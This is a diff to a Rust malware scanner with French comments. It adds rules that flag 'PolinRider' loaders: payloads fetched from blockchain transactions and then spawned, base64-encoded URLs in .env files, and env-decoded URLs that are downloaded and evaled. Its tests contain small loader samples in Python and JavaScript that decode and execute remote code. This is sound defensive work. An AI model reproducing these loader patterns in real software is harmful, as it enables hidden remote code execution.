@@ -104,6 +104,29 @@ static SPACE_HIDDEN_CODE_RE: LazyLock<Regex> =
 static CHAIN_C2_RE: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r"api\.trongrid\.io|eth_getTransactionByHash").unwrap());
 
+/// Chargeur qui lit sa charge dans une transaction blockchain puis la lance :
+/// la variante Python de PolinRider écrit un `.js` temporaire et le passe à
+/// node via `subprocess`.
+static CHAIN_LOOKUP_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"api\.trongrid\.io|eth_getTransactionByHash|getAddressTransactions").unwrap()
+});
+static SPAWN_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"\bsubprocess\b|child_process|\bexecSync\s*\(|\bspawn\s*\(").unwrap()
+});
+
+/// `eval` d'un code téléchargé depuis une URL cachée en base64 dans une
+/// variable d'environnement : `atob(process.env.AUTH_API_KEY)`.
+static ENV_DECODE_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"atob\s*\(\s*process\.env|Buffer\.from\s*\(\s*process\.env\.\w+\s*,\s*['"]base64"#)
+        .unwrap()
+});
+
+/// Valeur `.env` qui est une URL encodée en base64 (`aHR0cDovL` = `http://`,
+/// `aHR0cHM6Ly` = `https://`).
+static ENV_B64_URL_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?m)^\s*(?:export\s+)?\w+\s*=\s*['"]?aHR0c(?:DovL|HM6Ly)"#).unwrap()
+});
+
 /// `"dev": "node init && next dev"` : le fichier `init` sans extension est le
 /// chargeur, quel que soit l'enchaînement qui suit (`&&`, `;`, `||`, rien).
 static NODE_INIT_SCRIPT_RE: LazyLock<Regex> =
@@ -122,6 +145,7 @@ fn is_polinrider_file(file_path: &Path, filename: &str, ext: &str) -> bool {
         || filename == "package.json"
         || filename == ".gitignore"
         || filename == "init"
+        || filename.starts_with(".env")
         || filename.eq_ignore_ascii_case("config.bat")
         || (filename == "tasks.json"
             && file_path
@@ -324,6 +348,16 @@ fn scan_polinrider(relative: &str, filename: &str, ext: &str, bytes: &[u8]) -> V
         }
         // Node saute la ligne `#!` quel que soit l'interpréteur : un shebang
         // shell n'exempte que si rien d'autre ne trahit le chargeur.
+        f if f.starts_with(".env") => {
+            if let Some(line) = first_line_matching(&content, &ENV_B64_URL_RE) {
+                push(
+                    Severity::High,
+                    "env-base64-url",
+                    "environment value is a base64-encoded URL (hidden C2 address)",
+                    Some(line),
+                );
+            }
+        }
         "init"
             if JS_LOADER_RE.is_match(&content)
                 && !(content.starts_with("#!")
@@ -641,6 +675,36 @@ pub fn scan_content(relative: &str, content: &str) -> Vec<Finding> {
             }
             offset += line.len();
         }
+    }
+
+    // Charge lue dans une transaction blockchain puis lancée (PolinRider,
+    // variante Python du 2026-11-10).
+    if let Some(m) = CHAIN_LOOKUP_RE.find(content)
+        && (SPAWN_RE.is_match(content) || has_exec)
+    {
+        out.push(finding(
+            Severity::Critical,
+            "chain-c2-loader",
+            "code fetched from a blockchain transaction is executed".into(),
+            relative,
+            Some(line_of(content, m.start())),
+            None,
+        ));
+    }
+    // URL cachée en base64 dans l'environnement, téléchargée puis évaluée
+    // dans la foulée : un bundle qui décode une config JSON depuis l'env et
+    // contient un `exec(` sans rapport bien plus loin n'est pas un chargeur.
+    if let Some(m) = ENV_DECODE_RE.find_iter(content).find(|m| {
+        exec_calls(content).any(|e| e.start() > m.start() && e.start() - m.start() <= 1000)
+    }) {
+        out.push(finding(
+            Severity::Critical,
+            "env-remote-eval",
+            "decodes a URL from an environment variable and evals what it downloads".into(),
+            relative,
+            Some(line_of(content, m.start())),
+            None,
+        ));
     }
 
     // Un fichier déjà suspect qui se tait en CI et se détache du processus
@@ -1075,6 +1139,32 @@ mod tests {
             b"@echo off\r\nrmdir /s /q node_modules\r\n",
         );
         assert_eq!(bat[0].severity, Severity::Medium);
+    }
+
+    #[test]
+    fn polinrider_python_chain_loader_and_env_eval_loader_are_critical() {
+        let py = "import subprocess as _sp\n_rpc = _load('https://ethereum.publicnode.com', {'method': 'eth_getTransactionByHash'})\n_source = bytes.fromhex(_rpc['result']['input'][2:]).decode()\n_sp.Popen(['node', _tmp.name])\n";
+        let found = rules(&scan_content("tests/conftest.py", py));
+        assert!(
+            found.iter().any(|t| t.contains("chain-c2-loader")),
+            "{found:?}"
+        );
+        let web3 = "const tx = await provider.send('eth_getTransactionByHash', [hash]);\n";
+        assert!(scan_content("node_modules/ethers/lib/provider.js", web3).is_empty());
+
+        let js = "const src = atob(process.env.AUTH_API_KEY);\nconst r = await proxy(src);\neval(await r.text());\n";
+        let found = rules(&scan_content("scripts/lint_skill_content.ts", js));
+        assert!(
+            found.iter().any(|t| t.contains("env-remote-eval")),
+            "{found:?}"
+        );
+    }
+
+    #[test]
+    fn polinrider_env_file_with_base64_url_is_flagged() {
+        let env = b"AUTH_API_KEY=aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2Fk\n";
+        assert!(polinrider(".env", env)[0].contains("env-base64-url"));
+        assert!(polinrider(".env", b"API_KEY=sk_test_123\nURL=https://example.com\n").is_empty());
     }
 
     #[test]
